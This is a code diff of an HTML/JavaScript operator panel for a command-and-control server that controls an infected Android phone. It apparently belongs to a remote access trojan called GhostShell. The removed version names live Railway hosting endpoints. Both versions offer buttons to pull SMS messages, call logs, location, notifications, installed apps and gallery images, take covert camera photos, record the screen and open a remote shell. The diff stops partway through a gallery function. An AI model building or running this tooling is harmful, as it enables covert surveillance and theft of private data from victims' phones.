@@ -3,1228 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GhostShell C2 - Railway</title>
+    <title>C2 Control Panel</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(135deg, #0a0f0f 0%, #1a1f1f 100%);
-            color: #e0e0e0;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        /* Header */
-        .header {
-            background: rgba(0, 255, 0, 0.03);
-            border: 1px solid #00ff00;
-            border-radius: 15px;
-            padding: 30px;
-            margin-bottom: 30px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.1), transparent);
-            animation: scan 10s linear infinite;
-        }
-
-        @keyframes scan {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .header h1 {
-            color: #00ff00;
-            font-size: 2.5em;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
-            position: relative;
-        }
-
-        .header .subtitle {
-            color: #888;
-            font-size: 1.1em;
-            position: relative;
-        }
-
-        /* Info Grid */
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-
-        .info-card {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid #333;
-            border-radius: 10px;
-            padding: 20px;
-            transition: all 0.3s ease;
-        }
-
-        .info-card:hover {
-            border-color: #00ff00;
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(0, 255, 0, 0.1);
-        }
-
-        .info-label {
-            color: #888;
-            font-size: 0.9em;
-            text-transform: uppercase;
-            margin-bottom: 5px;
-        }
-
-        .info-value {
-            color: #00ff00;
-            font-size: 1.2em;
-            font-weight: bold;
-            font-family: 'Courier New', monospace;
-            word-break: break-all;
-        }
-
-        /* Status Container */
-        .status-container {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid #333;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 20px;
-        }
-
-        .status-info {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-
-        .status-led {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-        }
-
-        .status-led.online {
-            background: #00ff00;
-            box-shadow: 0 0 20px #00ff00;
-        }
-
-        .status-led.offline {
-            background: #ff0000;
-            box-shadow: 0 0 20px #ff0000;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .status-text {
-            font-size: 1.2em;
-        }
-
-        .connection-string {
-            background: #0a0a0a;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-family: 'Courier New', monospace;
-            color: #00ff00;
-            border: 1px solid #333;
-        }
-
-        /* Stats Grid */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-
-        .stat-card {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid #333;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-
-        .stat-card:hover {
-            border-color: #00ff00;
-        }
-
-        .stat-value {
-            font-size: 2.5em;
-            font-weight: bold;
-            color: #00ff00;
-            margin-bottom: 5px;
-        }
-
-        .stat-label {
-            color: #888;
-            font-size: 0.9em;
-            text-transform: uppercase;
-        }
-
-        /* Mode Indicator */
-        .mode-indicator {
-            background: rgba(255, 255, 255, 0.02);
-            border: 1px solid #333;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .mode-badge {
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 0.9em;
-        }
-
-        .mode-badge.shell {
-            background: rgba(255, 255, 0, 0.2);
-            color: #ffff00;
-            border: 1px solid #ffff00;
-        }
-
-        .mode-badge.notification {
-            background: rgba(255, 0, 255, 0.2);
-            color: #ff00ff;
-            border: 1px solid #ff00ff;
-        }
-
-        .mode-badge.gallery {
-            background: rgba(0, 255, 255, 0.2);
-            color: #00ffff;
-            border: 1px solid #00ffff;
-        }
-
-        .current-dir {
-            font-family: 'Courier New', monospace;
-            color: #00ff00;
-            background: #0a0a0a;
-            padding: 8px 16px;
-            border-radius: 5px;
-            border: 1px solid #333;
-        }
-
-        /* Command Input */
-        .command-container {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 10px;
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-
-        .command-header {
-            background: #1a1a1a;
-            padding: 15px;
-            border-bottom: 1px solid #333;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .command-title {
-            color: #00ff00;
-            font-weight: bold;
-        }
-
-        .command-input-group {
-            display: flex;
-            padding: 15px;
-            gap: 10px;
-        }
-
-        .command-input {
-            flex: 1;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            padding: 12px;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            border-radius: 5px;
-            outline: none;
-            font-size: 14px;
-        }
-
-        .command-input:focus {
-            border-color: #00ff00;
-        }
-
-        .send-btn {
-            background: #00ff00;
-            color: #0a0a0a;
-            border: none;
-            padding: 12px 30px;
-            font-weight: bold;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-size: 14px;
-        }
-
-        .send-btn:hover {
-            background: #00cc00;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
-        }
-
-        .send-btn:disabled {
-            background: #333;
-            color: #888;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        /* Quick Commands */
-        .quick-commands {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-bottom: 20px;
-        }
-
-        .quick-btn {
-            background: #1a1a1a;
-            border: 1px solid #333;
-            color: #e0e0e0;
-            padding: 8px 16px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-size: 13px;
-        }
-
-        .quick-btn:hover {
-            border-color: #00ff00;
-            color: #00ff00;
-        }
-
-        .quick-btn.danger:hover {
-            border-color: #ff0000;
-            color: #ff0000;
-        }
-
-        /* Main Grid */
-        .main-grid {
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        /* Console */
-        .console-container {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        .console-header {
-            background: #1a1a1a;
-            padding: 15px;
-            border-bottom: 1px solid #333;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .console-title {
-            color: #00ff00;
-            font-weight: bold;
-        }
-
-        .console-output {
-            height: 400px;
-            padding: 15px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            line-height: 1.6;
-            background: #0a0a0a;
-        }
-
-        .console-line {
-            margin-bottom: 5px;
-            word-break: break-all;
-            border-bottom: 1px solid #1a1a1a;
-            padding-bottom: 3px;
-        }
-
-        .console-line .timestamp {
-            color: #666;
-            margin-right: 10px;
-            font-size: 11px;
-        }
-
-        .console-line .command {
-            color: #00ff00;
-            font-weight: bold;
-        }
-
-        .console-line .success { color: #00ff00; }
-        .console-line .error { color: #ff0000; }
-        .console-line .warning { color: #ffff00; }
-        .console-line .info { color: #00ffff; }
-
-        /* Device Info Panel */
-        .device-panel {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        .device-content {
-            padding: 15px;
-        }
-
-        .device-info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #1a1a1a;
-        }
-
-        .device-info-label {
-            color: #888;
-        }
-
-        .device-info-value {
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-        }
-
-        /* Tabs */
-        .tabs {
-            display: flex;
-            border-bottom: 1px solid #333;
-            margin-bottom: 15px;
-        }
-
-        .tab {
-            padding: 10px 20px;
-            cursor: pointer;
-            color: #888;
-            border-bottom: 2px solid transparent;
-            transition: all 0.3s ease;
-        }
-
-        .tab:hover {
-            color: #00ff00;
-        }
-
-        .tab.active {
-            color: #00ff00;
-            border-bottom-color: #00ff00;
-        }
-
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        /* Lists */
-        .list-container {
-            max-height: 300px;
-            overflow-y: auto;
-        }
-
-        .list-item {
-            background: rgba(255, 255, 255, 0.02);
-            border-left: 3px solid #00ff00;
-            padding: 10px;
-            margin-bottom: 8px;
-            border-radius: 0 5px 5px 0;
-        }
-
-        .list-item.sms {
-            border-left-color: #00ff00;
-        }
-
-        .list-item.notification {
-            border-left-color: #ff00ff;
-        }
-
-        .list-item.call {
-            border-left-color: #ffff00;
-        }
-
-        .list-item-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 5px;
-            color: #888;
-            font-size: 0.9em;
-        }
-
-        .list-item-content {
-            color: #e0e0e0;
-        }
-
-        .list-item-footer {
-            margin-top: 5px;
-            color: #666;
-            font-size: 0.8em;
-        }
-
-        /* Gallery */
-        .gallery-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-            gap: 10px;
-            max-height: 400px;
-            overflow-y: auto;
-            padding: 10px;
-        }
-
-        .gallery-item {
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 5px;
-            overflow: hidden;
-            aspect-ratio: 1;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .gallery-item:hover {
-            border-color: #00ff00;
-            transform: scale(1.05);
-        }
-
-        .gallery-item img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal.active {
-            display: flex;
-        }
-
-        .modal-content {
-            max-width: 90%;
-            max-height: 90%;
-        }
-
-        .modal-content img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-
-        .modal-close {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            color: #00ff00;
-            font-size: 30px;
-            cursor: pointer;
-        }
-
-        /* Loading */
-        .loading {
-            text-align: center;
-            color: #888;
-            padding: 20px;
-        }
-
-        .loading::after {
-            content: '';
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #00ff00;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-left: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .main-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .status-container {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            
-            .info-grid {
-                grid-template-columns: 1fr;
-            }
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #1a1a1a; color: #e0e0e0; margin: 0; padding: 20px; font-size: 14px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        h1, h2 { color: #4a90e2; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .status-bar { padding: 10px; background-color: #333; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .status-light { height: 15px; width: 15px; border-radius: 50%; background-color: #f00; transition: background-color 0.5s ease; }
+        .status-light.connected { background-color: #0f0; }
+        .button-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; margin-top: 15px; }
+        button { background-color: #4a90e2; color: white; border: none; padding: 12px; border-radius: 5px; cursor: pointer; font-size: 1em; transition: background-color 0.2s; }
+        button:hover { background-color: #357abd; }
+        button:disabled { background-color: #555; cursor: not-allowed; }
+        .input-group { margin-top: 15px; display: flex; gap: 10px; }
+        input[type="text"] { flex-grow: 1; padding: 10px; border-radius: 4px; border: 1px solid #555; background-color: #333; color: #e0e0e0; font-size: 1em; }
+        .log-area { background-color: #000; padding: 15px; border-radius: 5px; height: 400px; overflow-y: auto; font-family: 'SF Mono', 'Consolas', 'Courier New', monospace; margin-top: 20px; border: 1px solid #333; white-space: pre-wrap; word-wrap: break-word; }
+        .log-entry { padding: 5px 0; border-bottom: 1px solid #222; }
+        .log-entry.error { color: #ff6b6b; }
+        .log-entry.info { color: #87ceeb; }
+        .log-entry.sms { color: #98fb98; }
+        .log-entry.call { color: #f0e68c; }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <h1>⚡ GHOSTSHELL C2 - RAILWAY</h1>
-            <div class="subtitle">Advanced Command & Control Server v2.0</div>
+        <h1>C2 Web Control Panel</h1>
+        <div class="status-bar">
+            <span>Agent Status:</span>
+            <div id="statusLight" class="status-light"></div>
         </div>
-        
-        <!-- Railway Info -->
-        <div class="info-grid">
-            <div class="info-card">
-                <div class="info-label">Railway HTTP Domain</div>
-                <div class="info-value" id="httpDomain">web-production-aa67.up.railway.app</div>
-            </div>
-            <div class="info-card">
-                <div class="info-label">Railway TCP Proxy</div>
-                <div class="info-value" id="tcpProxy">mainline.proxy.rlwy.net:37745</div>
-            </div>
-            <div class="info-card">
-                <div class="info-label">Android Connection</div>
-                <div class="info-value" id="androidConn">mainline.proxy.rlwy.net:37745</div>
-            </div>
+
+        <h2>Core Commands</h2>
+        <div class="button-grid" id="commandButtons">
+            <button onclick="sendCommand('getsms')">Get SMS</button>
+            <button onclick="sendCommand('getcalllogs')">Get Call Logs</button>
+            <button onclick="sendCommand('list_app')">List Apps</button>
+            <button onclick="sendCommand('get_location')">Get Location</button>
+            <button onclick="sendCommand('deviceinfo')">Device Info</button>
+            <button onclick="sendCommand('screen_recorder')">Screen Recorder (20s)</button>
         </div>
-        
-        <!-- Status -->
-        <div class="status-container">
-            <div class="status-info">
-                <div class="status-led offline" id="statusLed"></div>
-                <span class="status-text" id="statusText">Checking connection...</span>
-            </div>
-            <div class="connection-string" id="localAddress">Loading...</div>
+
+        <h2>Interactive Modes</h2>
+        <div class="button-grid" id="modeButtons">
+            <button onclick="sendCommand('filemanager')">File Manager</button>
+            <button onclick="sendCommand('shell')">Shell</button>
+            <button onclick="sendCommand('notifikasi')">Notifications</button>
+            <button onclick="sendCommand('gallery')">Gallery</button>
         </div>
-        
-        <!-- Stats -->
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-value" id="statCommands">0</div>
-                <div class="stat-label">Commands</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="statNotifications">0</div>
-                <div class="stat-label">Notifications</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="statSMS">0</div>
-                <div class="stat-label">SMS</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="statCalls">0</div>
-                <div class="stat-label">Calls</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="statImages">0</div>
-                <div class="stat-label">Images</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="uptime">00:00:00</div>
-                <div class="stat-label">Uptime</div>
-            </div>
+
+        <h2>Camera & Flash</h2>
+        <div class="button-grid">
+            <button onclick="sendCommand('takefrontpic')">Take Front Pic</button>
+            <button onclick="sendCommand('takebackpic')">Take Back Pic</button>
+            <button onclick="sendCommand('flashon')">Flash On</button>
+            <button onclick="sendCommand('flashoff')">Flash Off</button>
         </div>
-        
-        <!-- Mode Indicator -->
-        <div class="mode-indicator" id="modeIndicator" style="display: none;">
-            <div class="mode-badge" id="modeBadge">Normal Mode</div>
-            <div class="current-dir" id="currentDir">/</div>
+
+        <h2>Advanced Commands</h2>
+        <div class="input-group">
+            <input type="text" id="textInput" placeholder="Enter command, URL, package name, or toast message...">
+            <button onclick="executeTextInput()">Send</button>
         </div>
-        
-        <!-- Quick Commands -->
-        <div class="quick-commands">
-            <button class="quick-btn" onclick="sendQuickCommand('deviceinfo')">📱 Device Info</button>
-            <button class="quick-btn" onclick="sendQuickCommand('getsms')">📨 Get SMS</button>
-            <button class="quick-btn" onclick="sendQuickCommand('getcalllogs')">📞 Get Calls</button>
-            <button class="quick-btn" onclick="sendQuickCommand('get_location')">📍 Get Location</button>
-            <button class="quick-btn" onclick="sendQuickCommand('list_app')">📋 List Apps</button>
-            <button class="quick-btn" onclick="sendQuickCommand('takebackpic')">📸 Back Camera</button>
-            <button class="quick-btn" onclick="sendQuickCommand('takefrontpic')">🤳 Front Camera</button>
-            <button class="quick-btn" onclick="sendQuickCommand('shell')">💻 Shell Mode</button>
-            <button class="quick-btn" onclick="sendQuickCommand('notifikasi')">🔔 Notifications</button>
-            <button class="quick-btn" onclick="sendQuickCommand('gallery')">🖼️ Gallery Mode</button>
-            <button class="quick-btn" onclick="sendQuickCommand('filemanager')">📁 File Manager</button>
-            <button class="quick-btn danger" onclick="sendQuickCommand('flashon')">💡 Flash On</button>
-            <button class="quick-btn danger" onclick="sendQuickCommand('flashoff')">💡 Flash Off</button>
-        </div>
-        
-        <!-- Command Input -->
-        <div class="command-container">
-            <div class="command-header">
-                <span class="command-title">🎮 COMMAND INPUT</span>
-                <span id="promptIndicator">C2 ></span>
-            </div>
-            <div class="command-input-group">
-                <input type="text" class="command-input" id="commandInput" placeholder="Enter command..." onkeypress="handleKeyPress(event)">
-                <button class="send-btn" id="sendButton" onclick="sendCommand()">SEND</button>
-            </div>
-        </div>
-        
-        <!-- Main Grid -->
-        <div class="main-grid">
-            <!-- Console -->
-            <div class="console-container">
-                <div class="console-header">
-                    <span class="console-title">🖥️ CONSOLE OUTPUT</span>
-                    <span>
-                        <button class="quick-btn" onclick="clearConsole()" style="padding: 4px 8px;">Clear</button>
-                    </span>
-                </div>
-                <div class="console-output" id="consoleOutput">
-                    <div class="console-line">
-                        <span class="timestamp">[{{ current_time }}]</span>
-                        <span class="info">[*] Server started. Waiting for device...</span>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Device Info -->
-            <div class="device-panel">
-                <div class="console-header">
-                    <span class="console-title">📱 DEVICE INFORMATION</span>
-                </div>
-                <div class="device-content" id="deviceInfo">
-                    <div class="loading">Waiting for device...</div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Tabs for SMS, Notifications, Calls -->
-        <div style="margin-top: 20px;">
-            <div class="tabs">
-                <div class="tab active" onclick="switchTab('sms')">📨 SMS</div>
-                <div class="tab" onclick="switchTab('notifications')">🔔 Notifications</div>
-                <div class="tab" onclick="switchTab('calls')">📞 Calls</div>
-                <div class="tab" onclick="switchTab('gallery')">🖼️ Gallery</div>
-            </div>
-            
-            <!-- SMS Tab -->
-            <div class="tab-content active" id="tab-sms">
-                <div class="list-container" id="smsList">
-                    <div class="loading">No SMS yet</div>
-                </div>
-            </div>
-            
-            <!-- Notifications Tab -->
-            <div class="tab-content" id="tab-notifications">
-                <div class="list-container" id="notificationsList">
-                    <div class="loading">No notifications yet</div>
-                </div>
-            </div>
-            
-            <!-- Calls Tab -->
-            <div class="tab-content" id="tab-calls">
-                <div class="list-container" id="callsList">
-                    <div class="loading">No calls yet</div>
-                </div>
-            </div>
-            
-            <!-- Gallery Tab -->
-            <div class="tab-content" id="tab-gallery">
-                <div class="gallery-grid" id="galleryGrid">
-                    <div class="loading">No images yet</div>
-                </div>
-                <div style="text-align: center; margin-top: 10px;" id="galleryControls">
-                    <button class="quick-btn" onclick="galleryPrev()" id="galleryPrev">← Previous</button>
-                    <span id="galleryPage">Page 1</span>
-                    <button class="quick-btn" onclick="galleryNext()" id="galleryNext">Next →</button>
-                </div>
-            </div>
-        </div>
+        <small>Use with: `open`, `run`, `toast on`, `cd`, `get`, etc. See logs for mode-specific commands.</small>
+
+        <h2>Agent Logs & Output</h2>
+        <div class="log-area" id="logArea"></div>
     </div>
-    
-    <!-- Modal for image preview -->
-    <div class="modal" id="imageModal" onclick="closeModal()">
-        <span class="modal-close">&times;</span>
-        <div class="modal-content">
-            <img id="modalImage" src="" alt="Preview">
-        </div>
-    </div>
-    
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+
     <script>
-        // Socket.IO connection
-        const socket = io();
-        let startTime = new Date();
-        let currentPage = 1;
-        let totalGalleryPages = 1;
-        let currentTab = 'sms';
-        let deviceConnected = false;
-        
-        // =============== UTILITY FUNCTIONS ===============
-        
-        function formatTime(timestamp) {
-            const date = new Date(timestamp);
-            return `${date.getHours().toString().padStart(2,'0')}:${date.getMinutes().toString().padStart(2,'0')}:${date.getSeconds().toString().padStart(2,'0')}`;
-        }
-        
-        function addConsoleLine(text, type = 'info', isCommand = false) {
-            const console = document.getElementById('consoleOutput');
-            const line = document.createElement('div');
-            line.className = 'console-line';
-            
-            const time = formatTime(new Date());
-            
-            let colorClass = type;
-            let prefix = '';
-            
-            if (isCommand) {
-                prefix = 'C2 >> ';
-                colorClass = 'command';
-            }
-            
-            line.innerHTML = `<span class="timestamp">[${time}]</span> <span class="${colorClass}">${prefix}${text}</span>`;
-            console.appendChild(line);
-            console.scrollTop = console.scrollHeight;
-        }
-        
-        function clearConsole() {
-            document.getElementById('consoleOutput').innerHTML = '';
-            addConsoleLine('Console cleared', 'warning');
-        }
-        
-        function updateStats() {
-            // Uptime
-            setInterval(() => {
-                const now = new Date();
-                const diff = new Date(now - startTime);
-                const hours = diff.getUTCHours().toString().padStart(2, '0');
-                const minutes = diff.getUTCMinutes().toString().padStart(2, '0');
-                const seconds = diff.getUTCSeconds().toString().padStart(2, '0');
-                document.getElementById('uptime').innerText = `${hours}:${minutes}:${seconds}`;
-            }, 1000);
-        }
-        
-        function switchTab(tab) {
-            currentTab = tab;
-            
-            // Update tab classes
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            
-            document.querySelector(`.tab:nth-child(${tab === 'sms' ? 1 : tab === 'notifications' ? 2 : tab === 'calls' ? 3 : 4})`).classList.add('active');
-            document.getElementById(`tab-${tab}`).classList.add('active');
-        }
-        
-        // =============== COMMAND FUNCTIONS ===============
-        
-        function sendCommand(cmd = null) {
-            const input = document.getElementById('commandInput');
-            const command = cmd || input.value.trim();
-            
-            if (!command) return;
-            
-            // Disable button while sending
-            document.getElementById('sendButton').disabled = true;
-            
-            addConsoleLine(command, 'success', true);
-            
-            fetch('/api/send_command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ command: command })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (!data.success) {
-                    addConsoleLine(`Error: ${data.error}`, 'error');
+        const logArea = document.getElementById('logArea');
+        const statusLight = document.getElementById('statusLight');
+        const commandButtons = document.querySelectorAll('#commandButtons button, #modeButtons button, .input-group button');
+        const textInput = document.getElementById('textInput');
+
+        let ws;
+
+        function connect() {
+            // Use wss for secure websocket connection, which is required for pages served over https.
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}`;
+
+            log('Attempting to connect to server...', 'info');
+            ws = new WebSocket(wsUrl);
+
+            ws.onopen = () => {
+                log('WebSocket connection established.', 'info');
+            };
+
+            ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+                    handleServerMessage(data);
+                } catch (e) {
+                    log(`Received raw data: ${event.data}`, 'raw');
                 }
-            })
-            .catch(error => {
-                addConsoleLine(`Error: ${error.message}`, 'error');
-            })
-            .finally(() => {
-                document.getElementById('sendButton').disabled = false;
-                if (!cmd) input.value = '';
-            });
+            };
+
+            ws.onclose = () => {
+                log('WebSocket disconnected. Retrying in 5 seconds...', 'error');
+                setAgentStatus(false);
+                setTimeout(connect, 5000);
+            };
+
+            ws.onerror = (error) => {
+                log('WebSocket error. See console for details.', 'error');
+                console.error("WebSocket Error:", error);
+            };
         }
-        
-        function sendQuickCommand(cmd) {
-            sendCommand(cmd);
-        }
-        
-        function handleKeyPress(event) {
-            if (event.key === 'Enter') {
-                sendCommand();
+
+        function setAgentStatus(isConnected) {
+            if (isConnected) {
+                statusLight.classList.add('connected');
+                commandButtons.forEach(b => b.disabled = false);
+            } else {
+                statusLight.classList.remove('connected');
+                commandButtons.forEach(b => b.disabled = true);
             }
         }
-        
-        // =============== GALLERY FUNCTIONS ===============
-        
-        function galleryNext() {
-            if (currentPage < totalGalleryPages) {
-                currentPage++;
-                sendCommand(`gallery_page ${currentPage}`);
-            }
+
+        function log(message, type = 'log') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logArea.appendChild(entry);
+            logArea.scrollTop = logArea.scrollHeight;
         }
-        
-        function galleryPrev() {
-            if (currentPage > 1) {
-                currentPage--;
-                sendCommand(`gallery_page ${currentPage}`);
-            }
-        }
-        
-        function openModal(src) {
-            document.getElementById('modalImage').src = src;
-            document.getElementById('imageModal').classList.add('active');
-        }
-        
-        function closeModal() {
-            document.getElementById('imageModal').classList.remove('active');
-        }
-        
-        // =============== UPDATE UI FUNCTIONS ===============
-        
-        function updateDeviceInfo(info) {
-            const container = document.getElementById('deviceInfo');
-            
-            if (!info || Object.keys(info).length === 0) {
-                container.innerHTML = '<div class="loading">Waiting for device...</div>';
+
+        function handleServerMessage(message) {
+            // Main data envelope from agent has a 'data' key
+            const payload = message.data || message;
+            const type = payload.type || 'UNKNOWN';
+
+            if (type === 'status') {
+                if (payload.payload === 'agent_connected') {
+                    setAgentStatus(true);
+                    log('Android Agent has connected.', 'info');
+                } else if (payload.payload === 'agent_disconnected') {
+                    setAgentStatus(false);
+                    log('Android Agent has disconnected.', 'error');
+                }
                 return;
             }
-            
-            let html = '';
-            const items = [
-                { label: 'Model', value: info.Model || 'N/A' },
-                { label: 'Manufacturer', value: info.Manufacturer || 'N/A' },
-                { label: 'Android Version', value: info.AndroidVersion || 'N/A' },
-                { label: 'SDK Version', value: info.SDKVersion || 'N/A' },
-                { label: 'Battery', value: info.Battery ? `${info.Battery}%` : 'N/A' },
-                { label: 'IP Address', value: info.IP || 'N/A' }
-            ];
-            
-            items.forEach(item => {
-                html += `
-                    <div class="device-info-row">
-                        <span class="device-info-label">${item.label}:</span>
-                        <span class="device-info-value">${item.value}</span>
-                    </div>
-                `;
-            });
-            
-            container.innerHTML = html;
+
+            // For other messages, just pretty-print the JSON
+            log(JSON.stringify(payload, null, 2), type.toLowerCase());
         }
-        
-        function addSMS(sms) {
-            const list = document.getElementById('smsList');
-            
-            if (list.children.length === 1 && list.children[0].classList.contains('loading')) {
-                list.innerHTML = '';
-            }
-            
-            const item = document.createElement('div');
-            item.className = 'list-item sms';
-            
-            const time = sms.date ? new Date(sms.date).toLocaleString() : formatTime(new Date());
-            
-            item.innerHTML = `
-                <div class="list-item-header">
-                    <span>From: ${sms.address || 'Unknown'}</span>
-                    <span>${time}</span>
-                </div>
-                <div class="list-item-content">${sms.body || ''}</div>
-            `;
-            
-            list.insertBefore(item, list.firstChild);
-            document.getElementById('statSMS').innerText = parseInt(document.getElementById('statSMS').innerText) + 1;
-        }
-        
-        function addNotification(notif) {
-            const list = document.getElementById('notificationsList');
-            
-            if (list.children.length === 1 && list.children[0].classList.contains('loading')) {
-                list.innerHTML = '';
-            }
-            
-            const item = document.createElement('div');
-            item.className = 'list-item notification';
-            
-            const time = formatTime(new Date());
-            
-            item.innerHTML = `
-                <div class="list-item-header">
-                    <span>${notif.packageName || 'Unknown'}</span>
-                    <span>${time}</span>
-                </div>
-                <div class="list-item-content">
-                    <div><strong>${notif.title || ''}</strong></div>
-                    <div>${notif.text || ''}</div>
-                </div>
-                <div class="list-item-footer">From: ${notif.userSender || 'Unknown'}</div>
-            `;
-            
-            list.insertBefore(item, list.firstChild);
-            document.getElementById('statNotifications').innerText = parseInt(document.getElementById('statNotifications').innerText) + 1;
-        }
-        
-        function addCall(call) {
-            const list = document.getElementById('callsList');
-            
-            if (list.children.length === 1 && list.children[0].classList.contains('loading')) {
-                list.innerHTML = '';
-            }
-            
-            const item = document.createElement('div');
-            item.className = 'list-item call';
-            
-            const typeColor = {
-                'INCOMING': '#00ff00',
-                'OUTGOING': '#ffff00',
-                'MISSED': '#ff0000'
-            }[call.call_type] || '#ffffff';
-            
-            item.innerHTML = `
-                <div class="list-item-header">
-                    <span>${call.number || 'Unknown'}</span>
-                    <span style="color: ${typeColor}">${call.call_type || 'Unknown'}</span>
-                </div>
-                <div class="list-item-content">
-                    Duration: ${call.duration_seconds || 0}s
-                </div>
-                <div class="list-item-footer">${call.date || formatTime(new Date())}</div>
-            `;
-            
-            list.insertBefore(item, list.firstChild);
-            document.getElementById('statCalls').innerText = parseInt(document.getElementById('statCalls').innerText) + 1;
-        }
-        
-        function updateGallery(files, page, totalPages) {
-            const grid = document.getElementById('galleryGrid');
-            
-            if (!files || files.length === 0) {
-                grid.innerHTML = '<div class="loading">No images</div>';
-                return;
